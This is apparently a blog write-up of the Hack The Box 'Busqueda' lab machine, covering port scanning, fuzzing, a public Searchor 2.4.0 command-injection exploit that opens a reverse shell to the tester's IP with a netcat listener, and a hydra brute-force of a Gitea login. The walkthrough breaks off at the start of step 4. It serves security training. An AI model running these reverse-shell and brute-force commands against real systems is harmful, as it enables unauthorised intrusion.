---
title: HTB - Busqueda
date: 2024-01-29
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, busqueda, nmap]
img_path: /assets/htb/fullpwn/busqueda
published: true
image:
    path: machine_info.png
---

## Overview

[**Busqueda**](https://app.hackthebox.com/machines/Busqueda) is an Easy Difficulty Linux machine that involves exploiting a command injection (CI) vulnerability, finding credentials in a configuration file and Docker containers. 

**Initial foothold**:  
	By leveraging a CI vulnerability present in a `Python` module, we gain user-level access to the machine. 

**Privilege escalation**:  
	To escalate privileges to `root`, we discover credentials within a `Git` config file, allowing us to log into a local `Gitea` service. Additionally, we uncover that a system check-up script can be executed with `root` privileges by a specific user. By utilizing this script, we enumerate `Docker` containers that reveal credentials for the `administrator` user's `Gitea` account. Further analysis of the system check-up script's source code in a `Git` repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with `root` privileges.

## Information gathering

Port scanning:

```bash
sudo nmap -sS -A -Pn --min-rate 10000 $busq

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

 To-do: 
  1. Add domain to local DNS
  2. Visit domain via browser
  3. Rescan port `80`
  4. Directory fuzzing
  5. Sub-domain fuzzing
  6. Vhost fuzzing

## Step 1

### Add domain to local DNS

```bash
# adding domain on local DNS file
$ grep htb /etc/hosts
10.10.11.208    searcher.htb
```

### Visit domain via browser

![](searchorVersion.png)

### Rescan port `80`

```bash
# web server re-scan
$ sudo nmap -sV -sC -p80 -Pn --min-rate 10000 $busq

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
| http-server-header:
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
```

### Directory, sub-domain, and vhost fuzzing

```bash
# directory fuzzing
$ ffuf -u http://searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -recursion -recursion-depth 1 -e .py,.aspx,.html,.php,.txt,.jsp -ic -v

[Status: 200, Size: 15262, Words: 1156, Lines: 330, Duration: 2013ms]
| URL | http://gitea.searcher.htb/administrator
    * FUZZ: administrator

[Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 403ms]
| URL | http://gitea.searcher.htb/v2
    * FUZZ: v2

[Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 28ms]
| URL | http://gitea.searcher.htb/server-status
    * FUZZ: server-status

# sub-domain fuzzing
$ ffuf -u http://FUZZ.searcher.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac -ic

# vhost fuzzing
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://searcher.htb -H "HOST: FUZZ.searcher.htb" -ac -c -ic

gitea                   [Status: 200, Size: 13237, Words: 1009, Lines: 268, Duration: 48ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1408 req/sec :: Duration: [0:02:30] :: Errors: 0 ::
```

### To-do

1. Add `gitea.searcher.htb` to local DNS file
2. Search known vulns for `Searchor 2.4.0`
3. Visit sub-domain via browser
4. Directory fuzzing for vhost
5. Learn about `Gitea` and `Werkzeug`
6. Search for known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`

## Step 2

### Add `gitea.searcher.htb` to local DNS file

```bash
# adding vhost to local DNS file
$ grep htb /etc/hosts
10.10.11.208    searcher.htb gitea.searcher.htb
```

### Search known vulns for `Searchor 2.4.0`

![](googleSearchor.png)

### Visit sub-domain via browser

![](giteaHome.png)

![](giteaVersion.png)

![](giteaUsers.png)

### Directory fuzzing for vhost

```bash
# directory fuzzing for vhost
$ ffuf -u http://gitea.searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -recursion -recursion-depth 1 -e .py,.aspx,.html,.php,.txt,.jsp -ic -v
```

### Learn about `Gitea` and `Werkzeug`

According to its [documentation](https://docs.gitea.com/):

> **Gitea** _is a painless self-hosted all-in-one software development service, it includes Git hosting, code review, team collaboration, package registry and CI/CD. It is similar to GitHub, Bitbucket and GitLab. The goal of this project is to provide the easiest, fastest, and most painless way of setting up a self-hosted Git service._

Based on [Werkzeug's documentation](https://werkzeug.palletsprojects.com/en/3.0.x/):

>_werkzeug_ German noun: “tool”. Etymology: _werk_ (“work”), _zeug_ (“stuff”)

> **Werkzeug** _is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries._

### Search for known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`

Nothing interesting comes up.

### To-do

1. Try RCE PoC for `Searchor 2.4.0`
2. Search known vulns for `Gitea 1.18.0`
3. Brute force for users found under `/explore/organizations`: `cody` and `administrator`. 

## Step 3

### Try RCE PoC for `Searchor 2.4.0`

>[Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

```bash
# start a listener
$ nc -lvnp 9001
listening on [any] 9001 ...
```

```bash
# run the PoC
$ bash exploit.sh searcher.htb 10.10.14.12
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.12:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

```bash
# catch the reverse shell
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 37578
bash: cannot set terminal process group (1658): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:~$ cat ~/user.txt
cat ~/user.txt
0cd960c6e0b2ed34c9d74fa2976f8e0d
```

### Search known vulns for `Gitea 1.18.0`

Nothing interesting comes back.

### Brute force the login form

In order to brute force the login form we need to first obtain the appropriate information:

1. When we attempt to login with random creds, no parameters are added to the URL address bar, such as `username` and `password`, so it is a `POST` form:

	![](testLogin.png)

2. The fail login message is: `Username or password is incorrect.`:

	![](errorMsg.png)

3. The `POST` request parameters are: 

	![](postData.png)

	```html
	<!-- POST parameters -->
	_csrf=KFFUC4l7C5mnfe_ObzIWX3rMLgs6MTcwNjU1NjQxOTE0Mjk5OTQwOQ&user_name=test&password=test
	```

Now, we are ready to create a user list with just the 2 usernames and then attempt a dictionary attack:

```bash
# create a user list
$ cat userList
administrator
cody
# perform a dictionary attack
$ hydra -L userList -P /usr/share/wordlists/rockyou.txt 10.10.11.208 http-post-form "/user/login:user_name=^USER^&password=^PASS^:F=Username or password is incorrect." -f
```

Unfortunately, nothing comes back!
### To-do

1. Search for privilege escalation paths:
	- SUIDs
	- Kernel version
	- Sensitive data within config files

## Step 4